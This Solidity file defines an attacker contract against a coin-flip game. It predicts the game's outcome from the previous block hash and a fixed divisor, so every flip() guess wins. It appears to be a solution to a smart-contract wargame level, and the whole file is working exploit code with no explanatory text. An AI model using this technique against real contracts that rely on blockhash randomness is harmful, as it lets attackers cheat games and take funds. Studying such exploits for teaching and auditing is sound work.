// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function consecutiveWins() external returns (uint256);

    function lastHash() external returns (uint256);

    function flip(bool) external returns (bool);
}

contract CoinFlipAttacker {
    address private target;

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        ICoinFlip coinFlipContract = ICoinFlip(target);

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = coinFlipContract.flip(side);
        require(result, "guess failed");
    }
}
